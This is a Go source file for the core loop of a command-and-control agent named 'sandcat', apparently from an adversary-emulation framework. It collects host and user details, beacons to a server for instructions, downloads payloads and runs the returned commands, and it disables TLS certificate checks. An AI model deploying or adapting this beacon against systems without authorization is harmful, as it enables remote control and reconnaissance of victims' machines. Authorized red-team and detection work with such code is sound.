package core

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"os/user"
	"reflect"
	"runtime"
	"strconv"
	"strings"
	"time"
	"path/filepath"

	"../contact"
	"../execute"
	"../util"
	"../output"
	"../privdetect"
)

var (
	globalSleep int
	globalWatchdog int
)

func runAgent(coms contact.Contact, profile map[string]interface{}) {
	checkin := time.Now()
	for {
		beacon := coms.GetInstructions(profile)
		profile["paw"] = beacon["paw"]
		if len(beacon) != 0 {
			checkin = time.Now()
		}
		if beacon["watchdog"] != nil {
			globalWatchdog = beacon["watchdog"].(int)
		}
		if beacon["sleep"] != nil {
			globalSleep = beacon["sleep"].(int)
		}
		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
			cmds := reflect.ValueOf(beacon["instructions"])
			for i := 0; i < cmds.Len(); i++ {
				cmd := cmds.Index(i).Elem().String()
				command := util.Unpack([]byte(cmd))
				output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", command["id"]))
				payloads := coms.DropPayloads(command["payload"].(string), profile["server"].(string), profile["paw"].(string))
				go coms.RunInstruction(command, profile, payloads)
				util.Sleep(command["sleep"].(float64))
			}
		} else {
			util.Sleep(float64(globalSleep))
		}
		util.EvaluateWatchdog(checkin, globalWatchdog)
	}
}

func buildProfile(server string, executors []string, privilege string, c2 string) map[string]interface{} {
	host, _ := os.Hostname()
	user, _ := user.Current()

	profile := make(map[string]interface{})
	profile["server"] = server
	profile["host"] = host
	profile["username"] = user.Username
	profile["architecture"] = runtime.GOARCH
	profile["platform"] = runtime.GOOS
	profile["location"] = os.Args[0]
	profile["pid"] = os.Getpid()
	profile["ppid"] = os.Getppid()
	profile["executors"] = execute.DetermineExecutor(executors, runtime.GOOS, runtime.GOARCH)
	profile["privilege"] = privilege
	profile["exe_name"] = filepath.Base(os.Args[0])
	profile["c2"] = strings.ToUpper(c2)
	return profile
}

func chooseCommunicationChannel(profile map[string]interface{}, c2Config map[string]string) contact.Contact {
	coms, _ := contact.CommunicationChannels[profile["c2"].(string)]
	if !validC2Configuration(coms, profile["c2"].(string), c2Config) {
		output.VerbosePrint("[-] Invalid C2 Configuration! Defaulting to HTTP")
		profile["c2"] = "HTTP"
		coms, _ = contact.CommunicationChannels[profile["c2"].(string)]
	}
	return coms
}

func validC2Configuration(coms contact.Contact, c2Selection string, c2Config map[string]string) bool {
	if strings.EqualFold(c2Config["c2Name"], c2Selection) {
		if _, valid := contact.CommunicationChannels[c2Selection]; valid {
			return coms.C2RequirementsMet(c2Config["c2Key"])
		}
	}
	return false
}

func Core(server string, group string, sleep string, delay int, executors []string, c2 map[string]string, verbose bool, watchdog string) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	sleepInt, _ := strconv.Atoi(sleep)
	watchdogInt, _ := strconv.Atoi(watchdog)
	privilege := privdetect.Privlevel()

	globalSleep = sleepInt
	globalWatchdog = watchdogInt

	output.SetVerbose(verbose)
	output.VerbosePrint("Started sandcat in verbose mode.")
	output.VerbosePrint(fmt.Sprintf("server=%s", server))
	output.VerbosePrint(fmt.Sprintf("group=%s", group))
	output.VerbosePrint(fmt.Sprintf("sleep=%d", sleepInt))
	output.VerbosePrint(fmt.Sprintf("watchdog=%d", watchdogInt))
	output.VerbosePrint(fmt.Sprintf("privilege=%s", privilege))
	output.VerbosePrint(fmt.Sprintf("initial delay=%d", delay))
	output.VerbosePrint(fmt.Sprintf("c2 channel=%s", c2["c2Name"]))

	profile := buildProfile(server, executors, privilege, c2["c2Name"])
	util.Sleep(float64(delay))

	for {
		coms := chooseCommunicationChannel(profile, c2)
		if coms != nil {
			for { runAgent(coms, profile) }
		}
		util.Sleep(300)
	}
}
